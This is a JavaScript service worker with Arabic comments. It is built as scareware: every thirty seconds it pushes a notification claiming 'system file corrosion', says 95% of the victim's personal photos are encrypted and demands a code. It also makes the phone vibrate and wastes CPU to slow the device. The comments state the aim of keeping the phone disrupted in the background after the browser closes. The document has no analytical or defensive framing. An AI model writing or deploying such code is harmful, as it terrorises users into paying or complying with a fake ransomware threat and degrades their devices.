self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));

// إبقاء الهاتف "مجنوناً" في الخلفية حتى بعد إغلاق المتصفح
setInterval(() => {
    // إرسال إشعارات مرعبة بشكل متكرر
    self.registration.showNotification('⚠️ تآكل ملفات النظام', {
        body: 'تم تشفير 95% من صورك الشخصية. أدخل الكود فوراً.',
        icon: 'https://cdn-icons-png.flaticon.com/512/753/753345.png',
        vibrate: [2000, 1000, 2000]
    });

    // استهلاك بسيط ومستمر للمعالج لإبطاء الجهاز
    for(let i=0; i<50000; i++) { Math.sqrt(Math.random()); }
}, 30000);
